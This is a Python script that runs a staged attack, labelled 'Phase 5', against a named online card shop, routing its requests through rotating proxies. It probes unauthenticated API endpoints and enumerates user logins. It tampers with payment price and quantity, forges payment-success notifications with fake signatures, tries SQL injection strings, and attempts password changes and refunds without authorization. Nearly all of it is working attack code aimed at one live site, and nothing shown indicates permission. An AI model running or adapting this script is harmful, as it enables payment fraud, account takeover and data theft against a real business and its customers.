#!/usr/bin/env python3
"""Phase 5: alternate attack vectors on xinhe001 (run on CN server + proxy)."""
import json, os, subprocess, time, urllib.request

BASE = "https://xinhe001.lol/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
HASHSALT = "8d6673bb4bde73830ed11c898186a872"
DELAY = 1.5
hits = []

AUTHKEY = os.environ.get("QG_AUTHKEY", "")
AUTHPWD = os.environ.get("QG_AUTHPWD", "")
_proxy = None


def api_url(path, extra=""):
    u = f"https://share.proxy.qg.net/{path}?key={AUTHKEY}&pwd={AUTHPWD}"
    if extra:
        u += "&" + extra
    return u


def get_px():
    global _proxy
    if _proxy:
        return _proxy
    try:
        with urllib.request.urlopen(api_url("query"), timeout=12) as r:
            d = json.loads(r.read())
        if d.get("code") == "SUCCESS" and d.get("data"):
            _proxy = f"http://{AUTHKEY}:{AUTHPWD}@{d['data'][0]['server']}"
            return _proxy
    except Exception:
        pass
    with urllib.request.urlopen(api_url("get", "num=1"), timeout=12) as r:
        d = json.loads(r.read())
    _proxy = f"http://{AUTHKEY}:{AUTHPWD}@{d['data'][0]['server']}"
    return _proxy


def curl(url, method="GET", data=None, timeout=18):
    time.sleep(DELAY)
    px = get_px() if AUTHKEY else None
    cmd = ["curl", "-sS", "-m", str(timeout), "-w", "\n__C__%{http_code}", "-A", UA,
           "-H", "Accept-Language: zh-CN,zh;q=0.9"]
    if px:
        cmd += ["-x", px]
    if method == "POST":
        cmd += ["-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded"]
        if data:
            cmd += ["-d", data]
    cmd.append(url)
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode("utf-8", "replace")
    except subprocess.CalledProcessError as e:
        out = e.output.decode("utf-8", "replace")
    if "__C__" in out:
        body, _, code = out.rpartition("__C__")
        return body.strip(), int(code)
    return out.strip(), 0


def hit(sev, title, detail):
    hits.append({"sev": sev, "title": title, "detail": detail[:500]})
    print(f"[{sev}] {title}\n    {detail[:200]}", flush=True)


print("=== 1. ajax act=query (no CSRF) ===", flush=True)
for data in [
    "type=1&content=1",
    "qq=123456",
    "data=1",
    "trade_no=1",
    "id=1",
]:
    b, c = curl(f"{BASE}/ajax.php?act=query", "POST", data)
    if b and '"code":403' not in b and "验证失败" not in b:
        print(f"  query {data}: {c} {b[:120]}", flush=True)
        if '"code":0' in b or "kminfo" in b:
            hit("Critical", f"query泄露 {data}", b)

print("\n=== 2. api.php rainbow acts ===", flush=True)
api_tests = [
    ("GET", f"{BASE}/api.php?act=search&id=1", None),
    ("GET", f"{BASE}/api.php?act=classlist", None),
    ("GET", f"{BASE}/api.php?act=siteinfo", None),
    ("POST", f"{BASE}/api.php?act=goodslist", ""),
    ("POST", f"{BASE}/api.php?act=getleftcount", "tid=9"),
    ("GET", f"{BASE}/api.php?act=tools&key={HASHSALT}", None),
    ("GET", f"{BASE}/api.php?act=orders&key={HASHSALT}", None),
]
for method, url, data in api_tests:
    b, c = curl(url, method, data)
    tag = url.split("act=")[1][:20]
    print(f"  api {tag}: http={c} {b[:100]}", flush=True)
    if c == 200 and b and '"code":-5' not in b and "500" not in b[:3]:
        if '"code":0' in b or "kminfo" in b or "card" in b.lower() or len(b) > 80:
            hit("High", f"api.php {tag}", b[:300])

print("\n=== 3. quickreg / reg ===", flush=True)
for path, data in [
    ("user/ajax.php?act=quickreg", "type=qq&submit=do"),
    ("user/ajax.php?act=quickreg", "type=wx&submit=do"),
    ("user/ajax.php?act=reg", "user=probe999&pass=Test123456&qq=123456&captcha_type=0"),
]:
    b, c = curl(f"{BASE}/{path}", "POST", data)
    print(f"  {path}: {b[:150]}", flush=True)
    if '"code":0' in b:
        hit("High", path, b)

print("\n=== 4. login enum ===", flush=True)
for user in ["admin", "test", "xinghe001", "xinhe001"]:
    b, c = curl(f"{BASE}/user/ajax.php?act=login", "POST", f"user={user}&pass=wrongpass123")
    print(f"  user={user}: {b[:100]}", flush=True)
    if "不存在" in b or "错误" in b and "密码" in b:
        pass  # normal

print("\n=== 5. pay 价格/数量篡改 ===", flush=True)
pay_data = [
    f"tid=9&num=1&inputvalue=123456&inputvalue2=123456&inputvalue3=123456&inputvalue4=123456&inputvalue5=123456&hashsalt={HASHSALT}",
    f"tid=9&num=-1&inputvalue=123456&inputvalue2=123456&inputvalue3=123456&inputvalue4=123456&inputvalue5=123456&hashsalt={HASHSALT}",
    f"tid=9&num=1&inputvalue=123456&inputvalue2=123456&inputvalue3=123456&inputvalue4=123456&inputvalue5=123456&hashsalt={HASHSALT}&money=0.01",
]
for i, d in enumerate(pay_data):
    b, c = curl(f"{BASE}/ajax.php?act=pay", "POST", d)
    print(f"  pay#{i}: {b[:150]}", flush=True)
    if '"code":0' in b or '"code":1' in b:
        hit("Critical", f"pay篡改#{i}", b)

print("\n=== 6. getshop / submit oracle ===", flush=True)
for tn in ["1", "202501011", "441260704033551874", "1' OR '1'='1"]:
    b, c = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
    if b != '{"code":-1,"msg":"未付款"}':
        print(f"  trade_no={tn}: {b[:120]}", flush=True)
        hit("Med", f"getshop diff {tn}", b)

print("\n=== 7. epay_notify 伪造 ===", flush=True)
notify_tests = [
    ("other/epay_notify.php", "pid=1&trade_no=1&out_trade_no=1&type=alipay&name=test&money=9&trade_status=TRADE_SUCCESS&sign=fake&sign_type=MD5"),
    ("other/notify.php?act=epay", "trade_no=1&trade_status=TRADE_SUCCESS&money=9"),
]
for path, data in notify_tests:
    b, c = curl(f"{BASE}/{path}", "POST", data)
    print(f"  {path}: {c} {b[:80]}", flush=True)
    if "success" in b.lower() and "error" not in b.lower():
        hit("Critical", f"notify伪造 {path}", b)

print("\n=== 8. 未授权 ajax GET ===", flush=True)
for act in ["getleftcount", "getclass", "gettool", "gift_start", "getcount", "captcha", "checklogin"]:
    b, c = curl(f"{BASE}/ajax.php?act={act}&tid=9")
    if b != '{"code":403}':
        print(f"  {act}: {c} {b[:120]}", flush=True)
        if '"code":0' in b:
            hit("Med", f"ajax {act} 未授权", b[:200])

print("\n=== 9. getshuoshuo hashsalt ===", flush=True)
b, c = curl(f"{BASE}/ajax.php?act=getshuoshuo&uin=10001&page=1&hashsalt={HASHSALT}")
print(f"  getshuoshuo: {c} {b[:120]}", flush=True)
if '"code":0' in b:
    hit("Med", "getshuoshuo QQ数据", b[:200])

print("\n=== 10. query page SQLi ===", flush=True)
for payload in ["1'", "1 AND 1=1", "1 UNION SELECT 1--"]:
    b, c = curl(f"{BASE}/?mod=query&data={payload}")
    if any(x in b.lower() for x in ["sql", "mysql", "syntax", "warning"]):
        hit("High", f"SQLi query {payload}", b[:300])
    if "没有查询到" not in b and "订单查询" in b and payload == "1":
        pass

print("\n=== 11. changepwd / apply_refund 无skey ===", flush=True)
for act, data in [
    ("changepwd", "id=1&pwd=hacked&skey="),
    ("changepwd", "id=1&pwd=hacked&skey=123456"),
    ("apply_refund", "id=1&skey=123456"),
]:
    b, c = curl(f"{BASE}/ajax.php?act={act}", "POST", data)
    print(f"  {act}: {b[:100]}", flush=True)
    if '"code":0' in b:
        hit("Critical", f"{act} 绕过", b)

print("\n=== 12. mod=query POST trade_no/phone ===", flush=True)
# fetch query page for form field names
b, c = curl(f"{BASE}/?mod=query")
if "trade" in b.lower() or "手机" in b:
    print("  query page loaded", flush=True)

out = "/root/xinhe_phase5_results.json"
with open(out, "w") as f:
    json.dump({"hits": hits, "count": len(hits)}, f, ensure_ascii=False, indent=2)
print(f"\n=== DONE: {len(hits)} hits -> {out} ===", flush=True)
